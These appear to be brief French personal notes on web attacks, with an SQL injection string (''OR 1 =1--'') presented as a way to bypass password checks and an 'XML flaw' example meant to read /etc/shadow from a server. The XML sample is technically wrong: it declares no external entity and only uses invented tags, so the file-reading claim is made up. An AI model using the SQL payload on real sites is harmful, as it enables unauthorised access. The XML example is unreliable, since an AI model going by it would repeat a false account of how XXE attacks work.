### faille SQL  

language SQL reponse toujours vrai :  
bash```` 'OR 1 =1--'````   
permet de contourner des mots de passe et autre faille dans une page web  

### faille XML  

Le site accepte des fichiers XML. Tu envoies un XML spécial qui contient une instruction pour lire un fichier sur le serveur.  
Exemple : Tu envoies un XML piégé et le serveur te retourne le contenu d'un fichier de configuration avec des mots de passe.  

bash ````  
<?xml version="1.0" encoding="UTF-8"?>  
<root>  
    <meta name="source">/var/log/auth.log</meta>  
    <data id="payload">  
        <!-- This comment hides the real weapon -->  
        <file path="/etc/shadow"/>  
        <read mode="raw"/>  
    </data>  
</root>  
````  

